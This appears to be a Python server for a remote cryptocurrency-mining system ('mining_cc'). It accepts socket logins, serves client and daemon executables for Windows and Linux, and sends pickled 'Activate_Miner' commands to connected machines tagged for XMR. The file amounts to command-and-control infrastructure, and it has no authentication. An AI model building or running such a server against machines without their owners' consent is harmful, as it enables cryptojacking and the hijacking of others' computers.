import json
import os
from queue import Queue
import socket
import sys
import threading
import time
from datetime import datetime
from hashlib import md5
from typing import Literal
import pickle
from werkzeug.serving import make_server
from mining_cc.shared.utils import logger, payload_to_dict
from queue import Empty
from mining_cc.shared.hashes import single_file_hash, dirhash

from mining_cc.shared.ProtoHeader import *
from mining_cc.server.src.connection import *
#from server.src.gui_class import Server_GUI
import shutil
from flask import Flask, Response, request, send_from_directory

app = Flask(__name__)
app.use_x_sendfile = True

server_folder_name = "Server_Folder"

client_file_name = "client_main"
deamon_file_name = "deamon_main"

path_to_client_windows = server_folder_name + "/windows/" + client_file_name + ".exe"
path_to_client_linux = server_folder_name + "/linux/" + client_file_name + ".bin"

path_to_deamon_windows = server_folder_name + "/windows/" + deamon_file_name + ".exe"
path_to_deamon_linux = server_folder_name + "/linux/" + deamon_file_name + ".bin"

queue = Queue()

class Server:
    def __init__(self):
        try:
            with open("server_config.json", "r") as f:
                config = json.load(f)
        except FileNotFoundError:
            print("config not found. Creating one")
            config = {}
            config["Connections"] = {}

            with open("server_config.json", "w") as f:
                f.write(json.dumps(config, indent=2))
        print("loaded config: ", config)
        self.config = config
        self.connection_list = []
        self.id_dictionary = {}
        
    def run(self):
        # get the hostname
        host = socket.gethostbyname(socket.gethostname())
        port = 5000  # initiate port no above 1024

        server_socket_clients = socket.socket()  # get instance
        # look closely. The bind() function takes tuple as argument
        server_socket_clients.bind((host, port))  # bind host address and port together
        server_socket_clients.setblocking(False)
        # configure how many client the server can listen simultaneously
        server_socket_clients.listen()
        
        server_socket_deamons = socket.socket()  # get instance
        # look closely. The bind() function takes tuple as argument
        server_socket_deamons.bind((host, 5001))  # bind host address and port together
        server_socket_deamons.setblocking(False)
        # configure how many client the server can listen simultaneously
        server_socket_deamons.listen()
        
        check_every = 15
        last_check_time = time.time() - check_every
        i = 0
        while True:
            self.check_new_connection(server_socket_clients)
            self.check_new_connection(server_socket_deamons)
            for conn, address, username in self.connection_list:
                request_typ, payload = receive_proto_block(conn)
                payload = payload_to_dict(payload)
                if request_typ == LoginRequest:
                    self.LoginRequest(conn, address, payload)
                elif request_typ == ExitRequest:
                    self.ExitRequest(conn, address, username)
                elif request_typ == Request_New_Client:
                    self.Request_New_Client(conn, payload)
                elif request_typ == Request_Client_Hash:
                    logger("Request Client Hash")
                    self.Request_Client_Hash(conn, payload)
                elif request_typ == Request_Miner_Hashes:
                    logger("Request Miner Hashes")
                    self.Request_Miner_Hashes(conn, payload)
                elif request_typ == Request_New_Folder:
                    logger(f"Request New Folder: {payload}")
                    self.Request_New_Folder(conn, payload)
                if username in self.config["Connections"]:
                    self.config["Connections"][username]["Last_seen"] = datetime.today().strftime("%Y/%m/%d %H:%M:%S")

            while True:
                try: miner_id, data = queue.get_nowait()
                except Empty: break
                print(miner_id, data, self.id_dictionary)
                try: self.id_dictionary[miner_id].send(send_pickle_data(Activate_Miner, pickle.dumps(data)))
                except: (BlockingIOError, ConnectionAbortedError)
                
                
    def closing(self):
        print("Closing.. Save Config")
        with open("server_config.json", "w") as f:
            f.write(json.dumps(self.config, indent=2))
        sys.exit()
        
    def Request_Client_Hash(self, conn: socket.socket, paylod):
        os_system = paylod["OS_System"]
        if os_system == "windows":
            path_to_client = path_to_client_windows
            filename = client_file_name + ".exe"
        elif os_system == "linux":
            path_to_client = path_to_client_linux
            filename = client_file_name + ".bin"
        else:
            logger(f"OS_System not found: {os_system}")
            return
        
        if not os.path.isfile(path_to_client):
            logger("client_main.exe not found")
            return
        
        hash = str(single_file_hash(path_to_client))
        print(f"Client Hash: {hash}")
        try:
            conn.send(send_client_hash({"filename":filename, "hash":hash}))
        except BlockingIOError:
            return
    
    def Request_New_Client(self, conn: socket.socket, payload):
        try:
            os_system = payload["OS_System"]
            if os_system == "windows":
                path_to_client = path_to_client_windows
                file_name = client_file_name + ".exe"
            elif os_system == "linux":
                path_to_client = path_to_client_linux
                file_name = client_file_name + ".bin"
            else:
                logger(f"OS_System not found: {os_system}")
                return

            print("upload Client.exe")
            conn.setblocking(True)
                   
            file_size = os.path.getsize(path_to_client)
            print("File Size is :", file_size, "bytes")
            #file_size_in_bytes = file_size.to_bytes(8, 'big')

            print("Sending the file size")
            conn.send(send_client_info({"file_name": file_name, "file_size":file_size}))
            #msg_type, payload = receive_proto_block(conn)
            #print(f"[SERVER]: {payload.decode()}")

            print("Sending the file data")
            with open(path_to_client, 'rb') as f1:
                conn.send(send_client_data(f1.read()))
            conn.send(send_client_finished())
            conn.setblocking(False)
        except AttributeError:
            conn.close()
        except (ConnectionResetError, ConnectionAbortedError):
            print(f"Connection: {conn} Connection Reset while updating Client")
            conn.setblocking(False)
            return
               
    def Request_Miner_Hashes(self, conn, payload):
        print(payload)
        os_system = payload["OS_System"]
        if os_system == "windows":
            server_folder = server_folder_name + "/windows"
        elif os_system == "linux":
            server_folder = server_folder_name + "/linux"
        else:
            logger(f"OS_System not found: {os_system}")
            return
        
        hash_json = {}
        for file in os.listdir(server_folder):
            file_path = server_folder + "/" + file
            if not os.path.isdir(file_path):
                continue
            # is dir
            hash_d = dirhash(file_path, excluded_files=["config.json"])
            hash_json[file] = hash_d
        print(hash_json)
            
        conn.send(send_miner_hashes(hash_json))
        
    def Request_New_Folder(self, conn, payload):
        try:
            os_system = payload["OS_System"]
            folder_name = payload["folder_name"]
            if os_system == "windows":
                server_folder = server_folder_name + "/windows"
            elif os_system == "linux":
                server_folder = server_folder_name + "/linux"
            else:
                logger(f"OS_System not found: {os_system}")
                return
            
            logger(f"uploading folder: {folder_name}")
            conn.setblocking(True)
            shutil.make_archive(server_folder + "/" + folder_name, "zip", server_folder + "/" + folder_name)
            folder_size = os.path.getsize(server_folder + "/" + folder_name + ".zip")
            logger("Send folder Info")
            conn.send(send_folder_info({"folder_name": folder_name, "folder_size": folder_size}))
            print(f"{folder_name} Size is :", folder_size, "bytes")
            
            print("Sending the file data")
            with open(server_folder + "/" + folder_name + ".zip", 'rb') as f1:
                conn.send(send_folder_data(f1.read()))
            conn.send(send_folder_finished())
            conn.setblocking(False)
            logger(f"Uploading finished")
        except AttributeError:
            conn.close()
        except (ConnectionResetError, ConnectionAbortedError):
            print(f"Connection: {conn} Connection Reset while updating Client")
            conn.setblocking(False)
            return


    def ExitRequest(self, conn, address, username):
        print("connection deleted")
        self.connection_list.remove([conn, address, username])

    def LoginRequest(self, conn, address, payload):
        username = payload.decode()
        if username in self.config["Connections"]:
            print("old user connected")
        else:
            print("new user connected")
            self.config["Connections"][username] = {"Sheet": "XMR"}
            with open("server_config.json", "w") as f:
                f.write(json.dumps(self.config, indent=2))
        for i in range(len(self.connection_list)):
            if conn == self.connection_list[i][0] and address == self.connection_list[i][1]:
                self.connection_list[i][2] = username
        self.id_dictionary[username] = conn
        print(payload)

    def check_new_connection(self, server_socket):
        while True:
            try:
                conn, address = server_socket.accept()  # accept new connection
                conn.setblocking(False)
                conn.send(format_login_request(""))
                print("new connection!")
                self.connection_list.append([conn, address, -1])
            except BlockingIOError:
                break
            

class ServerThread(threading.Thread):
    def __init__(self, app):
        threading.Thread.__init__(self)
        self.server = make_server(socket.gethostbyname(socket.gethostname()), 4999, app)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        logger('starting server')
        self.server.serve_forever()

    def shutdown(self):
        self.server.shutdown()

def start_server():
    global server
    global app
    # App routes defined here
    server = ServerThread(app)
    server.start()
    logger('server started')

def stop_server():
    global server
    server.shutdown()

def run():
    #app.run(socket.gethostbyname(socket.gethostname()), 5000)
    start_server()
    Server().run()
    stop_server()
    

@app.route('/set_miner/<miner_id>', methods=["GET"])
def set_miner(miner_id):
    global queue
    print(f"set_miner: {miner_id}")
    data = json.loads(request.data)
    queue.put((miner_id, data))
    return Response(status=200)

@app.route('/', methods=["GET"])
def set_test():
    print(f"set_miner:")
    #print(request.data)
    #data = json.loads(request.data)
    #queue.put((miner_id, data))
    return Response(200)
    
@app.route('/<os_system>/download_deamon')
def download_deamon(os_system):
    if os_system == "windows":
        path_to_client = path_to_deamon_windows
        filename = deamon_file_name + ".exe"
        server_folder = server_folder_name + "/windows"
    elif os_system == "linux":
        path_to_client = path_to_deamon_linux
        filename = deamon_file_name + ".bin"
        server_folder = server_folder_name + "/linux"
    else:
        return Response(400)
    print("download deamon_received", os.getcwd() + "/" + path_to_client)
    #shutil.make_archive(os.getcwd() + "/" + server_folder + "/" + filename, "zip", os.getcwd() + "/" + server_folder + "/" + filename)
    return send_from_directory(directory=os.getcwd() + "/" + server_folder, path=filename,
                               as_attachment=True, download_name=filename,mimetype='application/x-binary')

if __name__ == "__main__":
    run()
